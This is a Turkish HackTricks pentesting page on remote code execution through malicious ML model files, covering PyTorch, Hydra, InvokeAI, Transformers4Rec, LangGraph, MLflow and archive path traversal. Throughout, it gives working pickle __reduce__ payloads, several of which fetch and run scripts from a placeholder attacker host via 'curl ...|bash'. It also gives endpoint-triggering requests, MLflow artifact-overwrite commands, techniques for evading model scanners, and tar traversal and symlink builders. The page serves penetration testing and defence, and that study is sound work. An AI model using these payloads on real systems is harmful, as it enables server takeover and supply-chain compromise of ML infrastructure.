# Modeller RCE

{{#include ../banners/hacktricks-training.md}}

## Modelleri yükleyerek RCE

Machine Learning modelleri genellikle ONNX, TensorFlow, PyTorch vb. farklı formatlarda paylaşılır. Geliştiriciler bu modelleri kullanmak için makinelerine veya üretim sistemlerine yükleyebilir. Modellerin kötü amaçlı kod içermemesi beklenir; ancak bazı durumlarda model, tasarlanmış bir özellik olarak veya model yükleme kütüphanesindeki bir güvenlik açığı nedeniyle sistemde rastgele kod çalıştırmak için kullanılabilir.

Aşağıdaki tabloda bu kategorideki örnek güvenlik açıkları listelenmiştir:

| **Framework / Tool**        | **Güvenlik Açığı (varsa CVE)**                                                    | **RCE Vektörü**                                                                                                                           | **Referanslar**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | `torch.load` içinde *güvensiz serileştirme çözme* **(CVE-2025-32434)**                                                              | Model checkpoint'indeki kötü amaçlı pickle kod çalıştırılmasına yol açar (`weights_only` korumasını atlatır)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + kötü amaçlı model indirme kod çalıştırılmasına yol açar; management API'de Java serileştirme çözme RCE'si                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load` üzerinden güvensiz checkpoint serileştirme çözme **(CVE-2025-23298)**                                           | Güvenilmeyen checkpoint, `load_model_trainer_states_from_checkpoint` sırasında pickle reducer'ı tetikler → ML worker'da kod çalıştırır            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + güvensiz MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Kullanıcı denetimindeki `filter` anahtarı SQL/JSON-path sözdizimi enjekte eder; `UNION SELECT` sahte bir checkpoint satırı oluşturur, ardından `msgpack` serileştirme çözme işlemi saldırganın seçtiği Python kodunu içe aktarır ve çağırır | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (güvensiz YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML'dan model yüklemek `yaml.unsafe_load` kullanır (kod çalıştırma) <br> **Lambda** katmanı içeren model yüklemek rastgele Python kodu çalıştırır          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite ayrıştırma)                                                                                          | Özel hazırlanmış `.tflite` modeli integer overflow tetikleyerek heap bozulmasına yol açar (olası RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` ile model yüklemek, saldırganın `__reduce__` payload'unu içeren pickle'ı çalıştırır                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (güvensiz `np.load`) *itiraz edilmiş*                                                                              | `numpy.load` varsayılan olarak pickled object dizilerine izin veriyordu – kötü amaçlı `.npy/.npz` dosyası kod çalıştırır                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dizin traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX modelinin external-weights yolu dizin dışına çıkabilir (rastgele dosyaları okuyabilir) <br> Kötü amaçlı ONNX model tar arşivi rastgele dosyaların üzerine yazabilir (RCE'ye yol açar) | |
| ONNX Runtime (tasarım riski)  | *(CVE yok)* ONNX custom ops / control flow                                                                                    | Custom operator içeren bir model, saldırganın native kodunun yüklenmesini gerektirir; karmaşık model grafikleri, istenmeyen hesaplamaları çalıştırmak için mantığı kötüye kullanır   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` etkin durumdayken model-load API'sinin kullanılması, göreli yol traversal ile dosya yazılmasına izin verir (ör. RCE için `.bashrc` üzerine yazma)    | |
| **GGML (GGUF formatı)**      | **CVE-2024-25664 … 25668** (birden fazla heap overflow)                                                                         | Hatalı biçimlendirilmiş GGUF model dosyası ayrıştırıcıda heap buffer overflow'larına neden olarak kurbanın sisteminde rastgele kod çalıştırılmasına olanak tanır                     | |
| **Keras (eski formatlar)**   | *(Yeni CVE yok)* Eski Keras H5 modeli                                                                                         | Lambda katmanı içeren kötü amaçlı HDF5 (`.h5`) modeli yüklendiğinde kodu hâlâ çalıştırır (Keras safe_mode eski formatı kapsamaz – “downgrade attack”) | |
| **Diğerleri** (genel)        | *Tasarım kusuru* – Pickle serileştirme                                                                                         | Birçok ML aracı (ör. pickle tabanlı model formatları, Python `pickle.load`), önlem alınmadığı sürece model dosyalarına gömülü rastgele kodu çalıştırır | |
| **NeMo / uni2TS / FlexTok (Hydra)** | `hydra.utils.instantiate()` işlevine aktarılan güvenilmeyen metadata **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Saldırganın denetimindeki model metadata/config, `_target_` değerini rastgele bir callable'a (ör. `builtins.exec`) ayarlar → “güvenli” formatlarda bile (`.safetensors`, `.nemo`, repo `config.json`) yükleme sırasında çalıştırılır | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Ayrıca, [PyTorch](https://github.com/pytorch/pytorch/security) tarafından kullanılanlar gibi pickle tabanlı bazı Python modelleri, `weights_only=True` ile yüklenmedikleri takdirde sistemde rastgele kod çalıştırmak için kullanılabilir. Bu nedenle, yukarıdaki tabloda listelenmeseler bile pickle tabanlı modellerin tümü bu tür saldırılara özellikle açık olabilir.

### Pickle tabanlı checkpoint'lerde statik kontrolleri atlatma

Kısıtlanmamış `pickle.load()`, `joblib.load()` veya `torch.load(..., weights_only=False)` çağıran bir model yükleme yolu yalnızca bir ayrıştırıcı değil, kod çalıştırma noktasıdır.<sup>[[22]](#references)</sup> PyTorch 2.6'da, özel bir pickle modülü verilmediğinde `torch.load()` varsayılan olarak `weights_only=True` kullanır; aşağıdaki örneklerde desteklenmeyen bir nesnenin yüklenebilmesi için kısıtlanmamış bir yükleyici veya bu korumayı devre dışı bırakan bir uygulama gerekir.<sup>[[4]](#references)</sup> Statik taramanın temiz sonuç vermesi bu sınırı değiştirmez.<sup>[[21]](#references)</sup>

Temel `__reduce__` primitive'i için [Python pickle serileştirme çözme](../pentesting-web/deserialization/#pickle), çalışma zamanı import kontrolleri içinse [Fickling'in ML import allowlist'i](../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling) sayfasına bakın.

#### Bir callable kaydedin, ardından `EXT2` ile çözümleyin

Bir pickle, `REDUCE` üzerinden `copyreg.add_extension` çağırarak modül/ad çiftini saldırganın seçtiği sayısal bir extension koduyla kaydedebilir. Daha sonra `EXT2` bu kodu callable'a çözümler; başka bir `REDUCE` ise callable'ı çağırabilir. Dolayısıyla kritik callable, `GLOBAL` veya `STACK_GLOBAL` opcode'unun operandı değildir. Binarly bunu `multiprocessing.util.spawnv_passfds` ile gösterdi; değerlendirilen beş tarayıcıdan dördü bunu kaçırırken SaferPickle tespit etti. Kayıt defterindeki değişiklik ve `EXT2` çözümlemesi aynı serileştirme çözme işlemi sırasında gerçekleşir.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

Bu, tam bir checkpoint değil, opcode taslağıdır: dış loader, çevresindeki pickle stream'ini kabul etmelidir. Yalnızca `GLOBAL` operandlarında tehlikeli callable'ları arayan bir scanner, sonraki lookup işlemini kaçırır; `EXT2` desteği olmayan bir scanner ise verdict üretmeden önce hata verebilir. Katı bir allowlist, `copyreg.add_extension`'ı da reddedebilir.<sup>[[21]](#references)</sup>

#### Oluşturulan code-object türlerini sıradan fonksiyonların arkasına gizleme

Başka bir pickle zinciri, `type(copy.copy)` üzerinden `FunctionType`'ı ve `type(copy.copy.__code__)` üzerinden `CodeType`'ı elde edebilir; ardından verilen bytecode'dan bir code object oluşturup bunu bir fonksiyona sarar ve çağırır. Yayımlanan varyant, `__code__`'a `operator.methodcaller('__getattribute__', '__code__')` üzerinden erişir; dolayısıyla pickle'ın iki constructor'ı da adlarıyla import etmesi gerekmez. `CodeType(...)` alan düzeni ve bytecode, CPython sürümüne özeldir; farklı bir interpreter için oluşturulmuş payload, çalıştırılmadan önce hata verebilir. SaferPickle yine de gösterilen örneği işaretledi, ancak seviyesini `suspicious` olarak düşürdü; değerlendirilen diğer dört scanner ise bunu kaçırdı.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### Bir pickle argümanından ikinci model yüklemesini tetikleme

Dış bir pickle, saldırganın sağladığı serialized modeli argüman olarak kullanarak `torch.storage._load_from_bytes` çağırabilir. Bu işlev `torch.load(io.BytesIO(b), weights_only=False)` çağırır; böylece üst düzey opcode scanner'a tek bir callable'a aktarılan baytlar gibi görünse de iç içe model weights-only kısıtlaması olmadan deserialize edilir. Dış yüklemenin yine de bu callable'a izin vermesi gerekir; `weights_only=True`, dış pickle'ın bunu kabul etmesini otomatik olarak sağlamaz. İç içe baytların içine bakmayan scanner'lar, içteki `GLOBAL`/`REDUCE` zincirini gözden kaçırabilir.<sup>[[21]](#references)[[23]](#references)</sup>

#### Yükleme sırasında eski bir pickle modül adını çözümleme

3'ten düşük pickle protokollerinde Python'ın varsayılan `fix_imports=True` ayarı, `_compat_pickle.IMPORT_MAPPING` aracılığıyla `commands.run` için olan `GLOBAL` referansını `subprocess.run` olarak eşler. Bu nedenle, modül dizgesini olduğu gibi bir `subprocess` denylist'iyle karşılaştıran scanner, çalışma zamanındaki callable'ı gözden kaçırabilir. Bunun için uyumluluk eşlemesini koruyan ve sonuçta oluşan çağrı argümanlarını kabul eden bir loader gerekir.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### ZIP olmayan bir checkpoint'i yalnızca ZIP tarayan bir scanner'dan geçirme

Format seçimi, opcode incelemesinden bağımsız olarak başarısız olabilir: Binarly, ModelScan 0.8.8'in `.bin`, `.pt`, `.pth` ve `.ckpt` dosyalarını ZIP'e özgü bir PyTorch scanner'ına yönlendirdiğini ve ZIP olmayan bir pickle akışını düz pickle scanner'ına geçmek yerine atladığını buldu. Ayrıca `torch.load()` tarafından kabul edilen ancak ModelScan ve JFrog'un incelemediği eski bir TAR model düzenini de belgeledi. Bunlar, her model scanner'ının özellikleri değil, belirli scanner sürümlerindeki açıklar.<sup>[[21]](#references)</sup>

#### Statik parser hatalı bir kuyruğa ulaşmadan önce çalıştırma

Bir pickle'ı `pickletools.genops()` ile baştan sona tarayan scanner, geçerli bir `REDUCE` sonrasındaki kesilmiş bir opcode nedeniyle hata verebilir. Kısıtlamasız unpickler, dosyanın sonundaki bu kısma ulaşmadan önce callable'ı zaten çağırmıştır; genel yükleme daha sonra hata verse bile. Raporlanan örnekte, çalıştıran `REDUCE`'un hemen arkasına kesilmiş bir `BINUNICODE` yerleştirilmiş, bu da daha önce gerçekleşmiş dosya yazma yan etkisine rağmen `pickletools.genops()` işlevinin hata vermesine neden olmuştu. Bu yöntem, yalnızca scanner ayrıştırma hatasını temiz kabul ederse veya dosyayı atlarsa scanner'ı atlatır. Yalnızca başarılı biçimde döndürülen bir model olmadan da yan etki önemliyse işe yarar; yüklemenin tamamlanmasını gerektiren bir hedef artifact'i reddedebilir.<sup>[[21]](#references)</sup>

### Hydra metadata → RCE (safetensors ile de çalışır)

`hydra.utils.instantiate()`, yapılandırma/metadata nesnesindeki noktalı herhangi bir `_target_` değerini import edip çağırır. Hugging Face Transformers gibi kütüphaneler **güvenilmeyen model metadata**'sını `instantiate()` işlevine aktardığında, saldırgan model yüklenirken hemen çalıştırılacak bir callable ve argümanlar sağlayabilir (pickle gerekmez).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Payload örneği (`.nemo` içindeki `model_config.yaml`, repo `config.json` veya `.safetensors` içindeki `__metadata__` ile çalışır):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Önemli noktalar:
- NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders ve FlexTok loaders içinde model başlatılmadan önce tetiklenir.
- Hydra’nın string block-list’i alternatif import paths (ör. `enum.bltns.eval`) veya uygulama tarafından çözümlenen adlar (ör. `nemo.core.classes.common.os.system` → `posix`) kullanılarak aşılabilir.<sup>[[14]](#references)</sup>
- FlexTok ayrıca string biçimindeki metadata’yı `ast.literal_eval` ile ayrıştırır; bu da Hydra çağrısından önce DoS’a (CPU/bellek tüketiminin aşırı artmasına) yol açabilir.

### 🆕  `torch.load` aracılığıyla InvokeAI RCE (CVE-2024-12029)

`InvokeAI`, Stable-Diffusion için popüler bir açık kaynaklı web arayüzüdür. **5.3.1 – 5.4.2** sürümleri, kullanıcıların modelleri rastgele URL’lerden indirip yüklemesine olanak tanıyan `/api/v2/models/install` REST endpoint’ini sunar.<sup>[[1]](#references)</sup>

Dahili olarak endpoint sonunda şunu çağırır:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Sağlanan dosya bir **PyTorch checkpoint (`*.ckpt`)** olduğunda, `torch.load` **pickle deserialization** işlemi gerçekleştirir. İçerik doğrudan kullanıcı denetimindeki URL'den geldiği için saldırgan, checkpoint içine özel bir `__reduce__` yöntemi olan kötü amaçlı bir nesne yerleştirebilir; bu yöntem **deserialization sırasında** çalıştırılır ve InvokeAI sunucusunda **remote code execution (RCE)** ile sonuçlanır.

Güvenlik açığına **CVE-2024-12029** atandı (CVSS 9.8, EPSS %61.17).

#### İstismar adımları

1. Kötü amaçlı bir checkpoint oluşturun:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. `payload.ckpt` dosyasını kontrol ettiğiniz bir HTTP sunucusunda barındırın (ör. `http://ATTACKER/payload.ckpt`).
3. Güvenlik açığı bulunan endpoint’i tetikleyin (kimlik doğrulama gerekmez):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI dosyayı indirdiğinde `torch.load()` çağrılır → `os.system` gadget'ı çalışır ve saldırgan InvokeAI sürecinin bağlamında kod yürütme elde eder.

Hazır exploit: **Metasploit** modülü `exploit/linux/http/invokeai_rce_cve_2024_12029` tüm akışı otomatikleştirir.<sup>[[3]](#references)</sup>

#### Koşullar

•  InvokeAI 5.3.1-5.4.2 (scan flag varsayılanı **false**)
•  `/api/v2/models/install` saldırganın erişimine açık olmalı
•  Sürecin shell komutlarını yürütme izni olmalı

#### Önlemler

* **InvokeAI ≥ 5.4.3** sürümüne yükseltin – yama varsayılan olarak `scan=True` ayarlar ve deserialization öncesinde malware taraması yapar.<sup>[[2]](#references)</sup>
* Checkpoint'leri programatik olarak yüklerken `torch.load(file, weights_only=True)` veya yeni [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) yardımcısını kullanın.
* Model kaynakları için allow-list / imza denetimi uygulayın ve hizmeti en az ayrıcalıkla çalıştırın.

> ⚠️ Unutmayın: Python pickle tabanlı **herhangi bir** formatı (birçok `.pt`, `.pkl`, `.ckpt`, `.pth` dosyası da dahil) güvenilmeyen kaynaklardan deserialize etmek doğası gereği güvensizdir.

---

Daha eski InvokeAI sürümlerini reverse proxy arkasında çalıştırmaya devam etmeniz gerekiyorsa, uygulanabilecek geçici bir önlem örneği:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE via güvensiz `torch.load` (CVE-2025-23298)

NVIDIA’nın Transformers4Rec’i (Merlin’in bir parçası), kullanıcı tarafından sağlanan yollar üzerinde doğrudan `torch.load()` çağıran güvensiz bir checkpoint yükleyicisi içeriyordu. `torch.load`, Python `pickle`’a dayandığından saldırganın kontrolündeki bir checkpoint, deserialization sırasında bir reducer aracılığıyla keyfi kod çalıştırabilir.<sup>[[5]](#references)</sup>

Güvenlik açığı bulunan yol (düzeltme öncesi): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Bunun RCE’ye yol açma nedeni: Python pickle’da bir nesne, bir callable ve argümanlar döndüren bir reducer (`__reduce__`/`__setstate__`) tanımlayabilir. Callable, unpickling sırasında çalıştırılır. Böyle bir nesne checkpoint’te bulunuyorsa, herhangi bir ağırlık kullanılmadan önce çalışır.

Minimal bir kötü amaçlı checkpoint örneği:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Teslimat vektörleri ve etki alanı:
- Repo’lar, bucket’lar veya artifact registry’ler üzerinden paylaşılan trojanized checkpoint’ler/modeller
- Checkpoint’leri otomatik yükleyen otomatik resume/deploy pipeline’ları
- Çalıştırma, genellikle yükseltilmiş ayrıcalıklara sahip (ör. container’larda root) training/inference worker’ları içinde gerçekleşir

Düzeltme: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802), doğrudan `torch.load()` kullanımını `transformers4rec/utils/serialization.py` içinde uygulanan, kısıtlı ve izin listesine dayalı bir deserializer ile değiştirdi. Yeni loader, türleri/alanları doğrular ve yükleme sırasında rastgele callable’ların çağrılmasını önler.<sup>[[7]](#references)</sup>

PyTorch checkpoint’lerine özel savunma önerileri:
- Güvenilmeyen verileri unpickle etmeyin. Mümkün olduğunda [Safetensors](https://huggingface.co/docs/safetensors/index) veya ONNX gibi çalıştırılabilir olmayan formatları tercih edin.
- PyTorch serialization kullanmanız gerekiyorsa `weights_only=True` olduğundan emin olun (daha yeni PyTorch sürümlerinde desteklenir) veya Transformers4Rec patch’ine benzer, özel ve izin listesine dayalı bir unpickler kullanın.<sup>[[4]](#references)</sup>
- Model provenance/signature’larını zorunlu tutun ve deserialization işlemini sandbox’ta çalıştırın (seccomp/AppArmor; root olmayan kullanıcı; kısıtlı dosya sistemi ve dış ağa çıkış yok).
- Checkpoint yüklenirken ML servislerinden beklenmeyen child process’leri izleyin; `torch.load()`/`pickle` kullanımını takip edin.

POC ve zafiyetli/patch referansları:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Patch öncesi zafiyetli loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- Kötü amaçlı checkpoint POC’si: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Patch sonrası loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Örnek – kötü amaçlı bir PyTorch modeli hazırlama

- Modeli oluşturun:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Modeli yükleyin:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’in FaceDetection-DSFD ürünü, kullanıcı denetimindeki verileri deserialize eden bir `resnet` endpoint’i sunar. ZDI, uzaktaki bir saldırganın kurbanı kötü amaçlı bir sayfayı/dosyayı yüklemeye zorlayabileceğini, bu sayfanın/dosyanın hazırlanmış bir serileştirilmiş blob’u bu endpoint’e göndermesini sağlayabileceğini ve `root` olarak deserialization işlemini tetikleyerek sistemin tamamen ele geçirilmesine yol açabileceğini doğruladı.

Exploit akışı tipik pickle kötüye kullanımını takip eder:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Deserialization sırasında erişilebilen herhangi bir gadget (constructor'lar, `__setstate__`, framework callback'leri vb.), taşıma yöntemi HTTP, WebSocket veya izlenen bir dizine bırakılan dosya olsun, aynı şekilde weaponize edilebilir.



### LangGraph checkpointer SQLi → MessagePack RCE

Bu saldırı zinciri ilginçtir çünkü saldırganın **kötü amaçlı bir model dosyası yüklemesi gerekmez**. Bunun yerine uygulama, bir **AI-agent persistence API** (`get_state_history(..., filter=...)`) sunar ve kullanıcı girdisi checkpointer sorgu oluşturucusuna ulaşır.

#### 1. Metadata filtrelerinde yapısal SQLi

Savunmasız bir SQLite kalıbı şöyle görünüyordu:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Değer daha sonra bağlanır, ancak `query_key`, **JSON path string** içine birleştirilir; bu nedenle sözlük anahtarındaki bir `'`, `'$.{query_key}'` ifadesinden çıkarak SQL inject eder. Aynı ders **JSON path'ler, identifier'lar, operator'lar, `LIMIT` ve TTL alanları** için de geçerlidir: placeholder'lar değerleri korur, sorgu syntax'ının yapısal bölümlerini değil.

#### 2. `UNION SELECT`, yalnızca veri hırsızlığına değil, downstream sink'lere de ulaşabilir

Sorgu, daha sonra şu şekilde tüketilen `type` ve serileştirilmiş `checkpoint` byte'larını döndürür:

```python
self.serde.loads_typed((type, checkpoint))
```

Bu, `WHERE` koşulundaki bir SQLi'nin **sahte bir sonuç satırı** enjekte edebileceği anlamına gelir:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Daha sonraki kod seçilen herhangi bir sütunu parse eder, deserialize eder, yazar veya çalıştırırsa bu sütunları sink'lerine kadar izleyin. Bu durumda sahte satır, SQLi'yi **saldırgan denetimindeki deserialization**'a dönüştürür.

#### 3. Güvenli olmayan MessagePack extension hook'ları, code gadget'larla eşdeğerdir

LangGraph'in `msgpack` yolu, iç içe geçmiş bir tuple'ı açan ve şunu çalıştıran özel bir extension hook kullanıyordu:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Dolayısıyla `("os", "system", "id > /tmp/pwned")` ile eşdeğer bir şeyi kodlayan MessagePack extension object, `os` modülünü içe aktarır, `system` öğesini çözümler ve komutu çalıştırır. AI framework'lerini incelerken dynamic import, reflection veya keyfi callable dispatch için **custom MessagePack/JSON/pickle reviver**'larını denetleyin.

#### 4. Agent framework'leri için pratik denetim kalıbı

Kullanıcı denetimindeki girdilerin şuralara ulaşıp ulaşmadığını inceleyin:
- state history / memory / replay / checkpoint listeleme API'leri
- SQL veya Redis query parçacıkları oluşturan yapılandırılmış filter builder'lar
- custom deserializer'lar (`pickle`, `msgpack`, `json` object hook'ları, YAML constructor'ları)
- persistence katmanından dönen satırlara güvenen kurtarma yolları

Bu özel zincir, güvenilmeyen kullanıcıların `filter` değerini denetleyebildiği self-hosted LangGraph dağıtımlarında **SQLite** veya **Redis** checkpointer kullanıldığında etkili oluyordu. Açıklamada belirtilen yamalı sürümler `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` ve `langgraph-checkpoint 4.0.1+` idi.<sup>[[15]](#references)</sup>

### MLflow PyFunc artifact'ının üzerine yazılarak pickle RCE

`PythonModel`'den oluşturulan bir MLflow PyFunc, serileştirilmiş nesneyi `python_model.pkl` olarak saklayabilir. Model metadata'sı `mlflow.pyfunc.model` öğesini loader olarak belirtir ve MLflow'un uygulaması, kaydedilen Python modeli için bu dosya adını kullanır. Dolayısıyla artifact store'a yazma erişimi, modeli daha sonra yükleyen başka bir uygulamada code execution'a yol açabilir.<sup>[[17]](#references)[[18]](#references)</sup>

İşe yarayan zincir **artifact yazma izni → pickle'ı değiştirme → bir inference consumer'ını yeniden yüklemeye zorlama** şeklindedir. Proxy kullanılan `mlflow-artifacts:/...` root'u olan bir experiment için experiment, run ve model artifact path'ini listeleyin. Tracking server, `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>` üzerinde `GET` ve `PUT` yöntemlerini sunar.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Minimal bir reducer, consumer artifact'ı unpickle eder etmez bir komut çalıştırabilir. Payload'ı `MLmodel` içinde belirtilen Python sürümüyle oluşturmak uyumluluk sorunlarını önler.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Mevcut modeli **yükleyen** işlemi tetikleyin; örneğin tahmin, puanlama veya deployment. Önce yeniden eğitmeyin; çünkü eğitim, kötü amaçlı artifact'i yeni bir modelle değiştirebilir. Uygulama hatası, exploitation'ın gerçekleşmediğini kanıtlamaz: reducer, kullanılabilir bir model yerine komutun tamsayı çıkış durumunu döndürür. ICMP veya HTTP callback gibi gözlemlenebilir bir yan etkiyle başlayın, ardından bunu son payload ile değiştirin.<sup>[[20]](#references)</sup>

Değerlendirme sırasında bir run oluşturma izni ile başka bir run'a ait artifact'lerin üzerine yazma iznini birbirinden ayırın. Kimlik doğrulamayı ve run başına güncelleme izinlerini gözden geçirin, `python_model.pkl` dosyasındaki beklenmeyen değişiklikleri inceleyin ve modelin kökenini ve bütünlüğünü yürütme sınırının bir parçası olarak değerlendirin. Güncel MLflow kodu ayrıca `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` ayarını destekler ve cloudpickle verilerini yüklemek yerine models-from-code artifact'lerinin kullanılmasını önerir.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Exposed model servers and ML infrastructure

Kötü amaçlı bir model yüklemek, ML altyapısında kod çalıştırmanın tek yolu değildir. İş gönderme API'leri, kod doğrulama uç noktaları ve self-hosted AI hizmetlerinin model registry pull işlemleri, herhangi bir model dosyası olmadan kod yürütülmesine yol açabilir. Bkz. [Exposed Self-Hosted AI Services](AI-Exposed-Self-Hosted-AI-Services.md).

## Models to Path Traversal

[**Bu blog gönderisinde**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) belirtildiği gibi, farklı AI framework'lerinin kullandığı model formatlarının çoğu, genellikle `.zip` olan arşivlere dayanır. Bu nedenle, bu formatları kötüye kullanarak path traversal saldırıları gerçekleştirmek ve modelin yüklendiği sistemden rastgele dosyaları okumak mümkün olabilir.<sup>[[16]](#references)</sup>

Örneğin, aşağıdaki kodla yüklendiğinde `/tmp` dizininde bir dosya oluşturacak bir model oluşturabilirsiniz:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Ya da aşağıdaki kodla, yüklendiğinde `/tmp` dizinine symlink oluşturacak bir model oluşturabilirsiniz:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Derinlemesine inceleme: Keras .keras serileştirme çözümlemesi ve gadget avı

.keras dahili yapısı, Lambda-layer RCE, ≤ 3.8 sürümlerindeki arbitrary import sorunu ve düzeltme sonrası allowlist içindeki gadget keşfi hakkında odaklı bir kılavuz için bkz.:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blogu – "CVE-2024-12029 – InvokeAI: Güvenilmeyen Verilerin Serileştirme Çözümlemesi"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI yama commit'i 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit modülü belgeleri](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
